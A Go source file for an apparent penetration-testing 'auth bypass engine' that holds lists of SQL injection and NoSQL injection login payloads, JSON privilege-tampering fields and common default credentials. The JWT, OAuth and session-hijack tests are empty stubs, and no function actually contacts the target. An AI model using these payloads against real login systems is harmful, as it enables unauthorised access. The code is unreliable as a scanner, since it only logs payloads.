package authbypass

import (
	"fmt"
	"sync"
	"time"

	"github.com/angel-platform/angel/pkg/logger"
)

type AuthBypassEngine struct {
	config *AuthBypassConfig
	log    *logger.Logger
	mu     sync.RWMutex
	jwt    *JWTModule
	oauth  *OAuthModule
	bf     *BruteforceModule
	sess   *SessionModule
}

func NewAuthBypassEngine(config *AuthBypassConfig) *AuthBypassEngine {
	if config == nil {
		config = DefaultAuthBypassConfig()
	}

	e := &AuthBypassEngine{
		config: config,
		log:    logger.New("authbypass-engine", logger.LevelInfo),
		jwt:    NewJWTModule(),
		oauth:  NewOAuthModule(),
		bf:     NewBruteforceModule(config),
		sess:   NewSessionModule(config),
	}

	return e
}

func (e *AuthBypassEngine) TestBypass(target string, method string) (*BypassResult, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	e.log.Info("Testing auth bypass on %s with method: %s", target, method)
	start := time.Now()

	bypassMethod := AuthBypassMethod(method)

	switch bypassMethod {
	case MethodSQLiAuth:
		return e.testSQLiAuth(target, start)
	case MethodNoSQLAuth:
		return e.testNoSQLAuth(target, start)
	case MethodJWTBypass:
		return e.testJWTBypass(target, start)
	case MethodJSONTampering:
		return e.testJSONTampering(target, start)
	case MethodDefaultCred:
		return e.testDefaultCred(target, start)
	case MethodOAuthBypass:
		return e.testOAuthBypass(target, start)
	case MethodSessionHijack:
		return e.testSessionHijack(target, start)
	default:
		return nil, fmt.Errorf("unknown bypass method: %s", method)
	}
}

func (e *AuthBypassEngine) FullBypass(target string) ([]*BypassResult, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	e.log.Info("Running full auth bypass on %s", target)
	start := time.Now()
	var results []*BypassResult

	methods := []AuthBypassMethod{
		MethodSQLiAuth,
		MethodNoSQLAuth,
		MethodJWTBypass,
		MethodJSONTampering,
		MethodDefaultCred,
		MethodOAuthBypass,
		MethodSessionHijack,
	}

	for _, method := range methods {
		var result *BypassResult
		switch method {
		case MethodSQLiAuth:
			result, _ = e.testSQLiAuth(target, start)
		case MethodNoSQLAuth:
			result, _ = e.testNoSQLAuth(target, start)
		case MethodJWTBypass:
			result, _ = e.testJWTBypass(target, start)
		case MethodJSONTampering:
			result, _ = e.testJSONTampering(target, start)
		case MethodDefaultCred:
			result, _ = e.testDefaultCred(target, start)
		case MethodOAuthBypass:
			result, _ = e.testOAuthBypass(target, start)
		case MethodSessionHijack:
			result, _ = e.testSessionHijack(target, start)
		}

		if result != nil {
			results = append(results, result)
			if result.Success {
				e.log.Info("Bypass succeeded with method: %s", method)
			}
		}
	}

	e.log.Info("Full bypass completed with %d methods tested", len(results))
	return results, nil
}

func (e *AuthBypassEngine) testSQLiAuth(target string, start time.Time) (*BypassResult, error) {
	payloads := []string{
		"' OR '1'='1' --",
		"' OR '1'='1' #",
		"admin' --",
		"' OR 1=1 --",
		"' UNION SELECT 1,2,3 --",
		"admin'/*",
		"' OR ''='",
	}

	result := &BypassResult{
		Method:    MethodSQLiAuth,
		Timestamp: time.Now(),
		Data:      make(map[string]string),
	}

	for _, payload := range payloads {
		result.Data["payload"] = payload
		result.Details = fmt.Sprintf("Testing SQLi auth bypass: %s", payload)
		e.log.Debug("Trying SQLi payload: %s", payload)
	}

	result.Duration = time.Since(start)
	return result, nil
}

func (e *AuthBypassEngine) testNoSQLAuth(target string, start time.Time) (*BypassResult, error) {
	payloads := []string{
		`{"username": {"$ne": ""}, "password": {"$ne": ""}}`,
		`{"username": {"$gt": ""}, "password": {"$gt": ""}}`,
		`{"username": "admin", "password": {"$ne": ""}}`,
		`{"$where": "this.password != null"}`,
		`{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}`,
	}

	result := &BypassResult{
		Method:    MethodNoSQLAuth,
		Timestamp: time.Now(),
		Data:      make(map[string]string),
	}

	for _, payload := range payloads {
		result.Data["payload"] = payload
		result.Details = fmt.Sprintf("Testing NoSQL auth bypass: %s", payload)
		e.log.Debug("Trying NoSQL payload: %s", payload)
	}

	result.Duration = time.Since(start)
	return result, nil
}

func (e *AuthBypassEngine) testJWTBypass(target string, start time.Time) (*BypassResult, error) {
	result := &BypassResult{
		Method:    MethodJWTBypass,
		Timestamp: time.Now(),
		Data:      make(map[string]string),
		Details:   "JWT bypass testing initiated",
	}

	result.Duration = time.Since(start)
	return result, nil
}

func (e *AuthBypassEngine) testJSONTampering(target string, start time.Time) (*BypassResult, error) {
	tamperPayloads := []map[string]interface{}{
		{"admin": true},
		{"role": "admin"},
		{"is_admin": true},
		{"permissions": []string{"*"}},
		{"user_id": 1, "is_superuser": true},
		{"account_type": "admin"},
	}

	result := &BypassResult{
		Method:    MethodJSONTampering,
		Timestamp: time.Now(),
		Data:      make(map[string]string),
	}

	for _, payload := range tamperPayloads {
		result.Details = fmt.Sprintf("Testing JSON tampering with payload")
		e.log.Debug("Trying JSON tampering payload")
		_ = payload
	}

	result.Duration = time.Since(start)
	return result, nil
}

func (e *AuthBypassEngine) testDefaultCred(target string, start time.Time) (*BypassResult, error) {
	creds := []CredentialPair{
		{Username: "admin", Password: "admin"},
		{Username: "admin", Password: "password"},
		{Username: "admin", Password: "123456"},
		{Username: "root", Password: "root"},
		{Username: "root", Password: "toor"},
		{Username: "admin", Password: "admin123"},
		{Username: "user", Password: "user"},
		{Username: "test", Password: "test"},
		{Username: "guest", Password: "guest"},
		{Username: "admin", Password: ""},
		{Username: "administrator", Password: "administrator"},
		{Username: "admin", Password: "Changeme123!"},
		{Username: "admin", Password: "P@ssw0rd"},
		{Username: "sa", Password: ""},
		{Username: "postgres", Password: "postgres"},
		{Username: "mysql", Password: "mysql"},
		{Username: "oracle", Password: "oracle"},
	}

	result := &BypassResult{
		Method:    MethodDefaultCred,
		Timestamp: time.Now(),
		Data:      make(map[string]string),
	}

	for _, cred := range creds {
		result.Data["username"] = cred.Username
		result.Data["password"] = cred.Password
		result.Details = fmt.Sprintf("Testing default credentials: %s:%s", cred.Username, cred.Password)
		e.log.Debug("Trying default cred: %s:%s", cred.Username, cred.Password)
	}

	result.Duration = time.Since(start)
	return result, nil
}

func (e *AuthBypassEngine) testOAuthBypass(target string, start time.Time) (*BypassResult, error) {
	result := &BypassResult{
		Method:    MethodOAuthBypass,
		Timestamp: time.Now(),
		Data:      make(map[string]string),
		Details:   "OAuth bypass testing initiated",
	}

	result.Duration = time.Since(start)
	return result, nil
}

func (e *AuthBypassEngine) testSessionHijack(target string, start time.Time) (*BypassResult, error) {
	result := &BypassResult{
		Method:    MethodSessionHijack,
		Timestamp: time.Now(),
		Data:      make(map[string]string),
		Details:   "Session hijack testing initiated",
	}

	result.Duration = time.Since(start)
	return result, nil
}

func (e *AuthBypassEngine) SetLoggerLevel(level logger.Level) {
	e.log.SetLevel(level)
}
